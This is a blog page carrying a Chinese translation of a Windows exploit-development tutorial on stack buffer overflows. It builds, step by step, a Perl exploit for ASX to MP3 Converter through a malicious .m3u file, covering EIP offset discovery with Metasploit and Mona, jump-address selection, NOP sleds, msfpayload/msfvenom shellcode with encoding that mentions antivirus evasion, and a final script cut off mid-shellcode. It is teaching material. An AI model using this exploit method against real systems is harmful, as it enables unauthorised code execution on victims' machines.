<!doctype html>
<html class="theme-next use-motion">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>




  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>


<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.3.0"/>


    <meta name="description" content="the boar infosec team" />




    <meta name="keywords" content="pentest,theboar" />





    <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.3.0" />



  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?0e9df871746366fae9aea18d3f41b447";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  <title> Windows Exploit Development —— 第二部分 栈溢出 // Th3 B04r </title>
</head>

<body>
  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <div id="header" class="header">
      <div class="header-inner">
        <h1 class="site-meta">
    <a href="/" class="brand">
        <span class="logo">
          <i class="icon-logo"></i>
        </span>
        <span class="site-title">Th3 B04r</span>
    </a>
</h1>


  <ul id="menu" class="menu">
    
      
      <li class="menu-item menu-item-home">
        <a href="/">
          <i class="menu-item-icon icon-home"></i> <br />
          首页
        </a>
      </li>
    
      
      <li class="menu-item menu-item-archives">
        <a href="/archives">
          <i class="menu-item-icon icon-archives"></i> <br />
          归档
        </a>
      </li>
    
      
      <li class="menu-item menu-item-tags">
        <a href="/tags">
          <i class="menu-item-icon icon-tags"></i> <br />
          标签
        </a>
      </li>
    
      
      <li class="menu-item menu-item-about">
        <a href="/about">
          <i class="menu-item-icon icon-about"></i> <br />
          关于
        </a>
      </li>
    
      
      <li class="menu-item menu-item-todo">
        <a href="/todo">
          <i class="menu-item-icon icon-todo"></i> <br />
          计划
        </a>
      </li>
    
  </ul>


      </div>
    </div>

    <div id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
            
          

          <div id="posts" class="posts-expand">
            
  

  <div class="post post-type-normal ">
    <div class="post-header">

      
      
        <h1 class="post-title">
          
          
            
              Windows Exploit Development —— 第二部分 栈溢出
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          
            发表于 2015-03-20
          
        </span>
        
          
        
      </div>
    </div>

    
      <div class="post-body">

        
        

        
          <p>原文地址: <a href="http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/" target="_blank" rel="external">http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/</a><br><a id="more"></a> </p>
<h1 id="Windows_漏洞利用程序开发之栈溢出">Windows 漏洞利用程序开发之栈溢出</h1><p>欢迎来到我的Windows开发开发系列的第2部分。在第1部分中,我介绍一些用于理解第2部分的基本概念。如果你还没有这样完成第一部分的阅读,我建议至少粗略浏览第一篇文章,充分理解里面列出的概念。在这些知识的基础上,现在我想谈谈一个人人皆知的基于windows的软件漏洞:基于堆栈缓冲区溢出。</p>
<h2 id="关于栈缓冲区溢出">关于栈缓冲区溢出</h2><p>在这一章我将从维基百科的简单程序开始介绍，你可以从<a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="external">这里</a> 下载。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/c26a7aa835321509ba9d9f64aeae433e.png" alt=""><br>在第1部分中,我回避了一个事实,传递一个大于11字符的参数到strcpy()函数，会由于缺乏边界检查导致缓冲区溢出。让我们看看这意味着什么。回忆一下，strcpy()写argv[1]用户栈的输入如下:<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/bf67670c362bb66bb7a4e26e50bb07c7.png" alt=""><br>如果输入不超过12个字符就不会出现问题(在foo函数中分配给变量c的堆栈大小为12),但如果输入超过11个字符,strcpy()将继续输入堆栈,不顾分配空间的大小。(注: 输入字符的限制是11而不是12（变量大小是12),是因为你必须为字符串结束符自动分配空间。）</p>
<p>举个例子,如果我们用150的参数（150 A’s）运行这个程序，会得到这样的结果:<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/11c28b769e97c692ff16029e9f4cdbd0.png" alt=""><br>如你所见,strcpy()覆盖所有的基本指针(保存EBP)和返回地址(保存EIP)argv[1]。注意:不要担心指针指到下一个医师记录和SE处理程序——我随后会修复。现在当程序转移执行保存的EIP的地址,它将试图跟随41414141(AAAA级),提高和错误/异常。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/d6e14570caa6d0ba25fe2b1c205deb93.png" alt=""><br>再者，因为strcpy()没有进行边界检查，所以给变量C分配的空间也没有有效性验证，这将导致把argv[1]整个都写入到栈里直到栈被填满。由于本地变量写入栈上面保存的返回地址和其他重要数据，而且 argv [1] 是写到栈底的，EIP 将被覆盖成如下图所示：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/beac9e3ca8ed4795e6986c096ba85a2b.png" alt=""><br>由于我们（用户）对传递给程序的参数有完全的控制权，感谢栈溢出，现在我们同样对EIP有了完全的控制权，程序的执行流程亦然。那意味着我们能够重新定向程序内部的代码执行流向 —— 这是一个简单的栈溢出示例。让我们瞅一眼在实际程序种找到一个栈溢出漏洞吧。</p>
<h2 id="找到有漏洞的程序">找到有漏洞的程序</h2><p>我们有机会查看Exp-Db（<a href="http://www.exploit-db.com/）一个包含各种程序的Exp并且可下载的漏洞档案站点。它有很多关于Exp开发的资源，同样你也可以提交自己的Exp到站点上。在以后的文章中，我们将讨论如何找到你自己程序的Exp。但在这里我们先演示个一个已经存在漏洞的吧～" target="_blank" rel="external">http://www.exploit-db.com/）一个包含各种程序的Exp并且可下载的漏洞档案站点。它有很多关于Exp开发的资源，同样你也可以提交自己的Exp到站点上。在以后的文章中，我们将讨论如何找到你自己程序的Exp。但在这里我们先演示个一个已经存在漏洞的吧～</a><br>在本例中，我将演示这个漏洞（<a href="http://www.exploit-db.com/exploits/8407/）。查看以下Exp-db上的笔记，其写到EIP被覆盖（41414141）在打开了一个音乐列表文件（.m3u）后，这个文件包含&quot;http://" target="_blank" rel="external">http://www.exploit-db.com/exploits/8407/）。查看以下Exp-db上的笔记，其写到EIP被覆盖（41414141）在打开了一个音乐列表文件（.m3u）后，这个文件包含&quot;http://</a>“ + 26,121个A。因为这是个POC，它实际上不会真正自由执行我们构造的恶意代码（只引起程序崩溃）。同样笔记写到这个POC并不是对任意版本都有效，它跑在Windows XP SP2 法文版上，这意味着我们在其他的操作系统上执行可能会看到不同结果。不管那么多，让我们下载ASX to MP3 Converter ver 3.0.0.7（<a href="http://asx-to-mp3-converter.en.softonic.com/）然后先在Windows" target="_blank" rel="external">http://asx-to-mp3-converter.en.softonic.com/）然后先在Windows</a> XP SP3安装它吧。</p>
<h2 id="复现漏洞/崩溃">复现漏洞/崩溃</h2><p>接下来，我们开始构造我们自己的Exp，调试程序的崩溃。我将用Perl来写这个Exp。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/21d99188e0c6eb877ac940381ae6e44c.png" alt=""><br>你可以看到，Perl脚本建立了一个m3u文件包含5000个A(41就是A的16进制值，查看ascii表 <a href="http://www.asciitable.com/）。注意到我们现在构造的这个m3u文件，在原POC包含“http://”这串字符已经不再是必要的了，尽管有些" target="_blank" rel="external">http://www.asciitable.com/）。注意到我们现在构造的这个m3u文件，在原POC包含“http://”这串字符已经不再是必要的了，尽管有些</a> m3u 基于利用漏洞攻击都需要做类似的位置/路径构造工作。你可以研究下一个有效的m3u文件的内容和文件头就会知道这为啥可以这样了。此外注意这类Exp，m3u漏洞利用文件的路径保存了影响最终EIP覆盖，所以确定Exp文件的名称与我例子中的相同（asx2mp3.m3u），并且将它保存到C盘的根目录，在你打开ASXtoMP3Converter之前～<br>运行Perl脚本（perl asx2mp3.perl）来产生m3u溢出文件，并保存到目标机器的C盘根目录，然后打开ASX to MP3 Converter程序，附加到ImDbg（同时确定按F9把程序跑起来）<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/60960f34df42ce06e00eaccc5b3e2bdc.png" alt=""><br>用这个软件打开asx2mp3.m3u（可以拖拽），你会马上看到程序崩溃了，并且在ImDbg中可以看到EIP已经被覆盖。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/defccc4a8b167738d1df8077ca1cdeb8.png" alt=""><br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/a47b057868ebf9e105a7d976ae69154a.png" alt=""> </p>
<h2 id="控制EIP的覆盖（确定偏移地址）">控制EIP的覆盖（确定偏移地址）</h2><p>OK，我们确认了POC确实可以引起程序崩溃。现在，为了控制程序的执行流向，并且让这个Exp发挥作用，要做的第一件事儿就是计算出在50000个字符缓冲区中EIP所在的那个点（溢出位置）。我们可以通过反复尝试和产生错误，来构建不同的多字符的缓冲区 （如 10,000 每个 a，B 的、 C、 D、 和 E 的），看看最后到哪里EIP会被覆盖，如下所示。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/1aa2fa841bf40e453e9df244659e86f0.png" alt=""><br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/54971a26910deeafe5e273de095410cf.png" alt=""><br>EIP被C字符串覆盖了，所以我们能够定位在20001到30000之间这段。继续缩小分量，直到找到最小的4字节是覆盖EIP的准确位置。这种方法是会花费一些时间，但是确实是最容易且有效的寻找覆盖点的方法。替代上面这种方法，我们还能够找到确切的EIP覆盖点，使用Msf的 pattern<em>create/Pattern_offset功能（可以从Kali上找到）。<br><em>*root@kali:/# locate </em>pattern</em><em>.rb<br>/usr/share/metasploit-framework/tools/pattern_create.rb<br>/usr/share/metasploit-framework/tools/pattern_offset.rb<strong><br>使用pattern_create，我将创建按一个50000的模板，插入到我的脚本中来创建一个m3u溢出文件
</strong>root@kali:/# /usr/share/metasploit-framework/tools/pattern_create.rb 50000<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad…<br><strong><br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/68b626e9b6bdd859b396f1855e9fb88b.png" alt=""><br>在ImDbg中重新启动ASX to MP3 Converter（可以按ctrl + F2） ,打开你新创建的m3u文件（从C盘根目录）然后尝试使其发生崩溃。这个时候我们能准确定位到EIP的覆盖点是48376D48 。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/9b476538823cc14f1114043583504e1d.png" alt=""><br>在我们50000个字符串缓冲区中，要找到确切的EIP覆盖偏移地址，我们将使用 pattern_offset.rb，语法如下：
</strong>root@kali:/# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x48376D48 50000<strong><br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/629b31652f4c8424e6e956c4c4359465.png" alt=""><br>在这种情况下，实际的偏移地址在第二列表（26121），它和在Exp-DB发布的原POC相同。我们可以通过修改如下脚本来测试它：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/011039176d2c1ea50c87fe97d2797390.png" alt=""><br>在前面的脚本中，我添加了一个变量$junk，其值位26121个A —— 就是我们的EIP偏移地址。接下来4字节就会被EIP正确的覆盖（我这里选的是B），而其余填满缓冲区的我用的是C。重新运行这个有漏洞的程序，使用确定了EIP覆盖点的m3u溢出文件，就可以看到如希望的EIP被覆盖了4个B。你也可以看到我们缓冲区和内存面板的内容来对比：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/fe7c7c7de397d9778a2e2b98c393a8b4.png" alt=""><br>让我们看看其他的方式来构造一个模板，然后计算出偏移地址。这次使用Mona插件（<a href="http://redmine.corelan.be/projects/mona）。把这个插件保存在ImDbg的PyCommands目录就可以使用了，用调试器运行ASX" target="_blank" rel="external">http://redmine.corelan.be/projects/mona）。把这个插件保存在ImDbg的PyCommands目录就可以使用了，用调试器运行ASX</a> to MP3 converter。<br>如果你想看以下Mona来产生Msf的模板，你可以输入!mona pc 50000并且它将会把这些写到一个文本文件。由于我大多数Exp都是在一个分开的Kali机器上写的，我更喜欢用pattern_create.rb这个脚本。无论用哪种方式，只要你能够构造出你的包含50000个字节且能引起程序崩溃m3u文件都可以，现在你能用findmsp mona命令来这么玩了。输入这条命令（!mona findmsp）后，mona会定位到EIP的覆盖点，同时会给出其他一些有用的信息，比如寄存器中你的缓冲区位置。如果你之前运行了!mona findmsp命令，就会如下输出：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/fa5192f628f47eff31e7d7101a00a0a9.png" alt=""><br>注意它是如何找到一个EIP在偏移5841的模板的，其可能看起来很相像，因为它是。我早些时候展示的Msf rb 脚本找到的三个模式匹配项。这是因为开箱（out-of-the-box），mona.py的FindMsp功能使用python的find()函数找到偏移：
</strong><pattern>offset = regpattern.find(hexpat)) </pattern>*</em><br>如果你熟悉Python，find函数只会返回第一个匹配的值，不是所有的匹配。在俺们的这块，我们更关注的第二次匹配到的，这样来确定正确的偏移位置。我更新了我的Mona副本使用正则表达式来代替Find函数，然后循环遍历整个匹配模式的所有偏移串联的匹配项。如果你感兴趣，基本的代码流程（虽然我应该提醒你这是Hack并需要更改一些其他的代码）</p>
<p><em>match in re.finditer(hexpat, regpattern):<br>    if offsetstr != “”:<br>        divisor = “ and “<br>    offsetstr = offsetstr + divisor + match.start( )<br>    …<br>[be sure to edit dbg.log to write offsetstr as %s]</em></p>
<p>以下将是Hack过的Mona输出信息：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/3cbbf3aa7e196f481bd5b257733f73f2.png" alt=""><br>现在你能看到已经返回所有实例的EIP了</p>
<h2 id="定位ShellCode">定位ShellCode</h2><p>现在我们确定了可以控制EIP（改变执行流程）。我们已经准备好修改Exp脚本来使其执行我们所选择的代码了。为了重定向执行过程，我们需要确定我们的Shellcode被分配到正确位置，然后确定其EIP。要搞定它，我们得在程序崩溃和EIP覆盖时，检查CPU寄存器和内存中的内容。让我们回到ImDbg的CPU视图：<br>注意这里有3个寄存器，他们当前都指向一些位置，在我们这50000字节的缓冲区中：EBX、ESP和EBP<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/b9b60233ba8e30c298facdf5eb7442d6.png" alt=""><br>我们想让我的EIP覆盖，让程序重定向到这3个寄存器中的某一个值，来执行其指向的代码。我选择哪个寄存器依据如下几个原则：</p>
<ol>
<li>在这块不间断代码的数量 —— 有时，我们的Exp代码写入内存时会被乱序或者删减，所以我们需要确定在那块有足够的空间来插入有用的ShellCode（通常至少需要500字节），并且怎么着代码都不会被程序修改。</li>
<li>我们能够重定向其中一个寄存器 —— 为了告诉程序重定向一个寄存器指向我们的ShellCode，我们需要用一个已经存在的指令（如JMP或者CALL）覆盖EIP。记住，EIP被覆盖的时候是用一个地址指针，而不是一个确切的指令。换言之，我们不能直接用对应的OPODE来跳到ESP（jump \xff\xe4）。反倒，我们需要用一个指向类似指令的内存地址来覆盖它。最重要的是，我们需要确定那个所用的地址时候否包含空字节（\x00）。为啥？因为一个空字节代表着结束，意味着只要程序遇到空字节，执行就会终止，并且你覆盖EIP之后的任何代码（在这里是我们的Shellcode）都不会执行了。这里也有一些空子节例外的例子，但是只要记住我们尽量避免有出现空字节就行了。如果你还是有些疑惑，没关系，我将慢慢给你演示。</li>
</ol>
<p>OK，所以我们需要告诉程序重定向或者跳到某个寄存器指向的地址。在这里，我们非常幸运，因为我们有足够的寄存器可以选择：EBX、ESP和EBP。<br>让我们用上面说的第一个标准来检查EBX寄存器：在那处连续的代码数量。在CPU寄存器面板，EBX地址处右键单击“跟随Dump”<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/c0c5dd28b901aa5fb80b438820912eea.png" alt=""><br>在内存Dump面板（左下角）你能够看到那块地址上下文的内容。向下滚动，注意看如果这里有任何空隙在这段缓冲区。终于，你能看到有空挡的地方了，在我这里恰巧是在000FCFCC后面。</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/fd0cfa09762e9cca54633672dc1f5e87.png" alt=""> </p>
<p>要预判我们在EBX有多少连续的ShellCode空间，我们能够从EBX开始（000FBBD4）到000FCFCCC相减。结果是0x13F8或者5112字节。那真是太特么足够了，所以EBX合格！<br>我们能继续这个尝试放到其他两个寄存器上（ESP和EBP）来确定那块是醉驾的。或者，我们用!mona findmsp来检查有效的空间。记住out-of-the-box，通过findmsp得出偏移只有对应的模式第一次出现，但检测长度仍应准确，对你有用当确定可用的空间shellcode。输入!mona findmsp 然后看下三个寄存器返回的长度</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/2ca961ad71feed6942ed9f8f14b4ae49.png" alt=""> </p>
<p>我们将要用的可用空间，在ESP处有很多，所以让我们检查用第二标准来检查下ESP：我们是否有能力控制重定向到我们的EIP覆盖点。作为第一个栈溢出的例子，我们将会只使用一个简单跳转或则调用来到达我们想要的寄存器。要完成这额，我们需要找到JMP ESP或者CALL ESP指令。<br>这里演示了你在ImDbg中该如何做：<br>在CPU指令面板右键点击，选择“搜索”—-&gt;“模块中所有命令”。这样将会搜索当前载入内存的模块中所有的jmp/call指令。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5e3c36843f4f71abda7941959ab8a464.png" alt=""><br>在条件框种输入目标指令，这里是“jmp esp”：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/f40410049578c7b90956e51ad76db0ea.png" alt=""><br>你能在以下截图中看到，我们获得许多结果，但问题是未已能用的地址（这些绿色的）都是系统模块 —— 注意他们全是”C:\Windows”和”C:\Program fiels\Mini-Stream\ASX to MP3 Converter…“，当这些DLL（模块）被确认是显然有用的有效指令，系统模块也许会在不同情况下有不同口味（版本不一样，函数的偏移不同?)。举个例子，一个DLL地址可能在Windows XP SP2和SP3上不同，或者都在SP3上但法文版和英文版不同。为了保证更好的可移植性的利用代码，你要选择的指令尽可能在固定应用模块。</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5029285280cf4c14695aa6768f0a2782.png" alt=""> </p>
<p>不幸的的是，我们得到了很相似的ijeguo（所有的系统模块），如果我们尝试call esp呢？注：这里有其他一些指令我们可以尝试，但是因为举例简单，所以我们仅仅只看jump和call.</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/402bdd26ad20dede20114716705b94d1.png" alt=""> </p>
<p>对于ESP寄存器来说，尽管程序自身美柚包含必须的jmp/call指令，我们在本例中仍然有两个可以使用的寄存器来替代OS模块，让我们先来试试<br>尝试搜索call ebx指令，这个时候结果包含了很多程序领空的指令地址</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/2622b80751a5991e5268203236a7134d.png" alt=""> </p>
<p>第一个结果的问题是他们都伴随有空字节，当你重新调用的时候会被当做一个字符串的结束，阻止EIP覆盖后的ShellCode执行。向下滚动，你可以看到一些没伴随空字节的地方：</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/8a02e88c363771935190f3addfa029c3.png" alt=""> </p>
<p>让我们来任选一个 —— 我选的是 01C27228 （从 MSA2Mcodec00.dll）。这个值我们将用于覆盖EIP。<strong>重要！！</strong>：你的Call ebx地址将会不同于你在前面截图看到的，这是因为一个叫地址”rebasing”的玩意儿导致的。实际上，你在Part3会看到，有很好的理由选择一个操作系统模块在这种情况下一个应用模块，尽管现在我还不想进入下一章节。到目前为止，你能够从程序任何一个call ebx地址继续，只要它不包含空字节。只要注意如果你重启了你的机器，Exp可能就不会再有效了，你也不得不重新选择其他的call ebx地址。<br>OK，所以我们已经成功复现了程序的崩溃，验证了EIP的控制，验证了我们的偏移到EIP（26,121），我们有一个寄存器（EBX）指向足 够长度的连续的缓冲区，并且我们有一个可用的地址覆盖EIP来call ebx指令。让我们把所有这些汇成代码。</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/6a9fd809fdf8e2cca87b9ae05ed46bfb.png" alt=""> </p>
<h2 id="找到我们的ShellCode偏移">找到我们的ShellCode偏移</h2><p>这是由我们50000字节组成的缓冲区：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/ce862f325e0d2fb496eb2386a6596f85.png" alt=""><br>EBX寄存器指向一个 a ～ 5100 字节的段填满了缓冲区的一部分。但是在哪儿？我们需要知道，所以我们可用有战略性的部署我们的ShellCode。我们可用使用一些不同的方法来确定ShellCode的偏移。</p>
<h3 id="暂停程序执行确定Shellcode偏移">暂停程序执行确定Shellcode偏移</h3><p>看一下我们的Exp截图<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/e226d2e9e70abb9d94e6bcbf7011aed5.png" alt=""><br>我们完成了构造INT（打断）指令（十六进制\xCC）来填充缓冲区区域。当程序执行到<br>INT的时候，它将会暂停。在调试器中，这是非常有利于我们观察CALL EBX在我们的缓冲区中的具体位置的。让我们看一眼当打开新的m3u文件时，缓冲区中发生了神马：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/4fefc5cfc9055606b58af6004d75f4a0.png" alt=""><br>你能看到当程序执行到INT确实暂停了。EBX包含000FBBD4和EIP 000FBBD5（当前指令）。如果我们在内存Dump面板中跟随上一次的内存地址，然后拖动滚动条到我们缓冲区的起始位置，我们就会在000F729E这里停下来。如果我们减去000FBD5（EBX的起始位置），我们将得到0x4937也就是十进制18743。这是最接近于我们CALL EBX指令的缓冲区长度，我们将会把ShellCode放在它后面。为啥说最接近于？缓冲区中可能有其他的一些地方是非连续的或者在写内存的时候被删除了，所以我们知道至少需要18743字节的缓冲区填充在能到达我们准备的ShellCode地址。我一会儿将演示一个更精确的计算长度方法。<br>另一个方法就是看它从我们要替换Exp代码缓冲区开始有多远？要算出来，在$fill（Junk + EIP =26125）之前加上18743缓冲区长度，等于44868。换句话说，至少，我们的ShellCode能够在缓冲区第一个44686字节跑起来（尽管我们想多做一点，来计算内存中变化的位置或可能打断我们缓冲区的位置）<br>使用INT暂停程序执行，并且检查内存/寄存器是一种快速决定SHellCODE替换位置的方法，但是这里还有更多更准确的方法。</p>
<h3 id="使用Msf的Pattern_offset-rb脚本">使用Msf的Pattern_offset.rb脚本</h3><p>Msf的这个脚本能够告诉我们EBX的准确位置，在基于模式匹配的缓冲区中（其就是使用姊妹脚本pattern_create.rb创建的），在崩溃/EIP覆盖时，重新查看我们的寄存器内容：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/b9b60233ba8e30c298facdf5eb7442d6.png" alt=""><br>EBX以Fn9F开头。使用Msf的脚本，我们能计算出准确模式缓冲区在哪儿分配：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/6ac7fccd47c1fa142d350db5990adfd9.png" alt=""><br>在我们的情况中，偏移是44877。在把这个脚本变为我自己的之前，让我演示下如何通过Mona插件获得同样的结果。</p>
<h3 id="使用Mona插件">使用Mona插件</h3><p>你可以使用从Mona里看到EBX缓冲区的偏移，只要敲以下 findmsp：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/c85493d7599f287ea29d2cf04be2ff96.png" alt=""><br>再一次，用out-of-the-box的mona插件， 你智能看到第一个偏移，但是截图中我更新过代码后就能看到确定的偏移了，就44877。<br>现在，我们知道了ShellCode的偏移，让我们更新下Exp的代码。如果一个偏移是44877，第一个26125 字节将被我们用垃圾代码填充（26121字节），然后覆盖EIP（后面的4字节）。这里保留了18752字节来写我们的ShellCode。让我们把脚本改成如下这样：</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/0841106bc896923855d820c65300bb0d.png" alt=""> </p>
<p>我在这里所做的仅仅只是加了一个$nop变量，其会把整个缓冲区在EIP后的都填满，并且在我们的SHellCode之前为了模拟到ShellCode偏移44877。我创建了一个比需要的SHellCode更长的$nops空间，并且都是由INT组成的，所以如果程序执行到$nops的空间，会直接暂停且我们能够看到已经做完了。如果从pattern_offset/mona得到的偏移是正确的，CALL EBX将会跑到正确的最后一个INT指令的位置（$nops区域的缓冲区 18752 + 1）。让我们用新的m3u跑起来，看看ImDbg的结果：</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/31c0a028a3b84d0c73adf44ba2b20b58.png" alt=""> </p>
<p>如你所见，我们刨刀了正确的最后一个INT指令上，然后下一条指令的第一个字节就是$fill的区域了（马上就到ShellCode那块了），这意味着pattern_offset/mona提供的偏移地址是正确的。事实上，我们还没有完全算正确 —— 我们的原始预测替换的地方就刚刚好了，因为我们能够（也一定）总是能放到一块不错的缓冲区，在我们的ShellCode在内存中被允许偏离之前。<br>这样做，我们会使用NOP来作为典型的例子，其在x86架构上的十六进制值是0x90。这一连串的NOPS放到一起形成了，通常叫为NOP链。当程序执行这一系列的NOPS时，它将会防守不管直到遇到一个可执行的指令，在我们这个例子中就是ShellCode了。<br>当构造完缓冲区时，一个好的主意通常是有EIP CALL/JMP指令在这一系列NOPS的开始或者中间。一旦我们有另一个很大的空间能够放SHellCOde，我将会在这之前放上一堆长度为18852（偏移18752 + 额外100长度填充）的NOP链。这个完整的缓冲区区域将会对Shellcode偏移和NOPS链都有用。<br>现在我们的缓冲区看起来就想下面这样子（最后一段区域是SHellcode）：</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/12b16f79264a7a278b41345401a0c957.png" alt=""> </p>
<h2 id="构造ShellCode">构造ShellCode</h2><p>最后一件需要做的事情，就是搞一些有实际用处的ShellCode了。当然，我们选择的ShellCode依赖于我们想干嘛 —— 比如弹个远程的Shell或者加个管理员用户等等。在我们的例子中，我将会选择一些适合初学者的 —— 打开WIndows自带的计算器（calc.exe）。下一件事情，我们要考虑的就是我们有没有一些特殊字符会打断ShellCode。举个例子，原因我们已经讨论过了，空字节在ShellCode中会有问题。同样有问题的还有回车、换行和其他字符串终止符。同样的情况下，程序本身也有可能不能处理某些字符或者值的变化（转换/编码/特征值等）。结果就是，ShellCode创建一些可能会引起错误的东西。幸运的是，在我们的例子中，ShellCode的创建是非常顺利的。你可以从Exp-db下载/复制ShellCode，但是这个例子中，我会给你展示如何用Msf创建一些基本的Payloads。<br>msf有一个命令行的ShellCode构造器功能叫msfpayload（新版本已经被分离咯～）你可以使用 -l 来切换 windows的payloads </p>
<p><em>msfpayload -l | grep windows</em></p>
<p>在我们的例子中，我将使用windows/exec这个Payloads，它的功能就是执行命令，和适合运行calc.exe。要使用msfpayload，你需要知道每个Payloads的相关选项，你可以通过在后面后面加上参数O。<br>给出可用的选项，语法如下：</p>
<p><em>msfpayload windows/exec CMD=calc.exe R</em></p>
<p>如果你用O参数来查看选项，你也许会注意到一个附加的选项叫 EXITFUNC。这个参数控制了ShellCode执行完之后会如何退出。我没有特意设定一个EXITFUNC的值，这意味着默认值“Thread”将会被启用，其会只会结束相关的线程。另一个选项和Payload退出相关的就是 SEH（让异常处理接管退出）和进程（干掉整个进程而不仅仅是线程）。EXITFUNC选项能够创建一个不同的效果，如Exp有啥行为在其结束后，所以你得尝试以下。举个例子，如果你注入一个Exp到父进程，进程会继续跑在Exp结束线程的时候，你也许想知道避免进程和替换固定线程。类似的，选择SEH选项，如果程序美柚执行任何错误处理的话，将会引起进程退出（那个最熟悉的提示）。<br>CMD选项就是它本身所代表的解释了，R选项代表着生成原始码，其会用原始的字节码输出我们的SHellCode。然后，我们需要在写进脚本之前将ShellCode编码。为了这样，我们能够重定向管道一些Msfpayload到Msfencode来实现，语法如下：</p>
<p><em>msfpayload windows/exec CMD=calc.exe R | msfencode -e x86/shikata_ga_nai -c 1 -t perl </em></p>
<p>-e 选项告诉msfencode哪个编码器将要使用，-c选项告诉有多少次迭代，-t选项则是输出那种格式，-b选项则告诉编码器有哪些坏字符需要排除。这个命令显示了227个a生成。在以后的帖子了，我准备了详细的编码相关的文章。但现在只要吉珠选择哪个编码器会影响到程序编码用户的输入（比如unicdoe），并且同时能够绕过杀毒软件的查杀。<br>另外一个小技巧，你可以干同样的事儿，用msfvenom模块，语法如下：</p>
<p><em>msfvenom -p windows/exec CMD= calc.exe -f perl -b ‘\x00\xff\x0a\x0d’</em></p>
<p>随便哪个都是可以来生成的～<br>你可以找到更多关于使用msfpayload的信息，链接在这里 <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" target="_blank" rel="external">http://www.offensive-security.com/metasploit-unleashed/Msfpayload</a></p>
<h2 id="整合到一块儿">整合到一块儿</h2><p>现在我们有了一个227字节的ShellCode，我们的最终的缓冲区看起来是像这样的（主要到我们有一个额外的4796字节空间能够让我们做一些想做的事情，比如用其他的ShellCode，体积大点儿的）。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/bf04a50c8ac999216664234301da3e1f.png" alt=""><br>这里是完整的ShellCode</p>
<pre><code><span class="comment">#!/usr/bin/perl</span>
 my $buffsize = <span class="number">50000</span>; <span class="comment"># sets buffer size for consistent sized payload</span>
my $junk = <span class="string">"\x41"</span> x <span class="number">26121</span>; <span class="comment"># offset to EIP overwrite</span>
my $eip = pack('V', <span class="number">0x01C27228</span>); <span class="comment"># call ebp (MSA2Mcodec00.dll) - YOURS WILL DIFFER!</span>
my $nops = <span class="string">"\x90"</span> x <span class="number">18752</span>;  

<span class="comment"># msfpayload windows/exec CMD=calc.exe R |</span>
<span class="comment"># msfencode -e x86/shikata_ga_nai -c 1 -t perl -b '\x00\x0a\x0d\xff'</span>
<span class="comment"># size 227</span>
my $shell =
<span class="string">"\xba\x8d\xf5\x02\x51\xda\xc0\xd9\x74\x24\xf4\x5b\x2b\xc9"</span> .
<span class="string">"\xb1\x33\x31\x53\x12\x03\x53\x12\x83\x66\x09\xe0\xa4\x84"</span> .
